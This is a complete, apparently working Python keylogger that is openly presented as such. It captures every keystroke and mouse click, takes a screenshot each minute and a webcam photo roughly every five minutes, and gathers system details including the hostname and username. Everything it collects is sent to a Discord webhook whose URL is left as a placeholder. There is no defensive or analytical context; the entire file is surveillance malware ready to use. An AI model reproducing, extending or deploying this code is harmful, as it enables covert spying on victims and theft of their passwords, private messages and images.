import os
import sys
import time
import threading
import platform
import subprocess
from io import BytesIO
from datetime import datetime
from pynput import keyboard, mouse
import requests
from PIL import Image, ImageGrab
import cv2
import json
import base64

class DiscordKeylogger:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.log = ""
        self.screenshot_count = 0
        self.webcam_count = 0
        self.system_info_sent = False
        self.system_info = self.get_system_info()
        self.running = True

    def get_system_info(self):
        """Gather system information"""
        info = {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Architecture": platform.architecture()[0],
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "Hostname": platform.node(),
            "Username": os.getenv('USERNAME') if platform.system() == 'Windows' else os.getenv('USER')
        }
        return info

    def send_to_discord(self, content=None, file_data=None, filename=None):
        """Send data to Discord webhook"""
        try:
            data = {}
            if content:
                data["content"] = content
            
            files = {}
            if file_data and filename:
                files["file"] = (filename, file_data)
            
            # Send system info only once at startup
            if not self.system_info_sent:
                info_text = f"```\nSystem Information:\n"
                for key, value in self.system_info.items():
                    info_text += f"{key}: {value}\n"
                info_text += "```"
                data["content"] = info_text + (content or "")
                self.system_info_sent = True
            
            response = requests.post(self.webhook_url, data=data, files=files)
            return response.status_code == 200
        except Exception as e:
            print(f"Error sending to Discord: {e}")
            return False

    def on_key_press(self, key):
        """Handle key press events"""
        try:
            if hasattr(key, 'char') and key.char:
                self.log += key.char
            else:
                special_key = f"[{key.name if hasattr(key, 'name') else str(key)}]"
                self.log += special_key
        except Exception as e:
            print(f"Error processing key: {e}")

    def on_mouse_click(self, x, y, button, pressed):
        """Handle mouse click events"""
        if pressed:
            self.log += f"[MOUSE CLICK ({button}) at ({x}, {y})]"

    def capture_screenshot(self):
        """Capture and send screenshot"""
        try:
            # Take screenshot
            screenshot = ImageGrab.grab()
            # Save to memory buffer
            buffer = BytesIO()
            screenshot.save(buffer, format='PNG')
            buffer.seek(0)
            
            # Send to Discord
            filename = f"screenshot_{self.screenshot_count}.png"
            self.screenshot_count += 1
            self.send_to_discord(file_data=buffer, filename=filename)
            return True
        except Exception as e:
            print(f"Error capturing screenshot: {e}")
            return False

    def capture_webcam(self):
        """Capture and send webcam image"""
        try:
            # Initialize webcam
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                print("Webcam not available")
                return False
            
            # Capture frame
            ret, frame = cap.read()
            cap.release()
            
            if not ret:
                print("Failed to capture webcam frame")
                return False
            
            # Convert to buffer
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
            image_buffer = BytesIO(buffer.tobytes())
            
            # Send to Discord
            filename = f"webcam_{self.webcam_count}.jpg"
            self.webcam_count += 1
            self.send_to_discord(file_data=image_buffer, filename=filename)
            return True
        except Exception as e:
            print(f"Error capturing webcam: {e}")
            return False

    def send_logs(self):
        """Send accumulated keystrokes"""
        if self.log.strip():
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.send_to_discord(f"```\nKeylog [{timestamp}]:\n{self.log}\n```")
            self.log = ""

    def periodic_tasks(self):
        """Handle periodic screenshot/webcam capture"""
        start_time = time.time()
        while self.running:
            current_time = time.time()
            
            # Take screenshot every 60 seconds
            if current_time - start_time >= 60:
                self.capture_screenshot()
                start_time = current_time
            
            # Take webcam shot every 5 minutes (300 seconds)
            if current_time % 300 < 1:  # Close to divisible by 300
                self.capture_webcam()
                time.sleep(1)  # Prevent multiple captures
            
            time.sleep(0.5)  # Check every 500ms

    def start(self):
        """Start the keylogger"""
        # Send initial system info
        self.send_to_discord("Keylogger started")
        
        # Start keyboard and mouse listeners
        keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
        mouse_listener = mouse.Listener(on_click=self.on_mouse_click)
        
        keyboard_listener.start()
        mouse_listener.start()
        
        # Start periodic task thread
        periodic_thread = threading.Thread(target=self.periodic_tasks)
        periodic_thread.daemon = True
        periodic_thread.start()
        
        try:
            while self.running:
                time.sleep(10)  # Send logs every 10 seconds
                self.send_logs()
        except KeyboardInterrupt:
            self.running = False
            self.send_logs()  # Send remaining logs
            self.send_to_discord("Keylogger stopped")

# Usage
if __name__ == "__main__":
    # Replace with your Discord webhook URL
    WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
    
    keylogger = DiscordKeylogger(WEBHOOK_URL)
    keylogger.start()
